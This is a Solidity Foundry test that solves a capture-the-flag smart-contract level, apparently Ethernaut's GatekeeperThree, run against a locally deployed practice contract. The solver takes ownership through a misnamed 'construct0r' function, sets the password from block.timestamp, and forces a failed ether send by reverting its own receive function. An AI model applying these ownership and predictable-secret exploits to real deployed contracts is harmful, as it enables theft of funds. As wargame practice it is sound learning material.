// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/28_gate_three.sol";

contract GateSolver {
    GatekeeperThree gate;
    uint public password = block.timestamp;
    bool allowReceive = true;
    constructor(GatekeeperThree _gate) {
        gate = GatekeeperThree(_gate);
        gate.createTrick();
        // set password
        SimpleTrick trick = gate.trick();
        console.log("constructor trick address: %s", address(trick));
        console.log("constructor trick address: %s", trick.trick());

        console.log("constructor password: %s", password);
    }

    function solve() public {
        // take ownership
        gate.construct0r();
        console.log("constructor password: %s", password);
        console.log("timestamp: %s", block.timestamp);
        gate.createTrick();
        // set password
        // SimpleTrick trick = gate.trick();
        // console.log("trick address: %s", address(trick));
        // console.log("trick address: %s", trick.trick());

        gate.getAllowance(block.timestamp);
        //send 0.001 ether to gate
        payable(gate).transfer(0.002 ether);
        allowReceive = false;
        gate.enter();
        allowReceive = true;
    }

    receive () external payable {
        if(!allowReceive) {            
            revert();
        }
    }
}

contract GateThree is Test {
    GatekeeperThree gate;
    GateSolver solver;
    function setUp() public {
        gate = new GatekeeperThree();        
        solver = new GateSolver(gate);
        // vm roll new block
        vm.warp(1 days);
        vm.roll(block.number + 1000);
    }

    function test_gateOpen() public {        
        payable(address(solver)).transfer(1 ether);
        solver.solve();

        assertEq(gate.entrant(), tx.origin);
    }
}
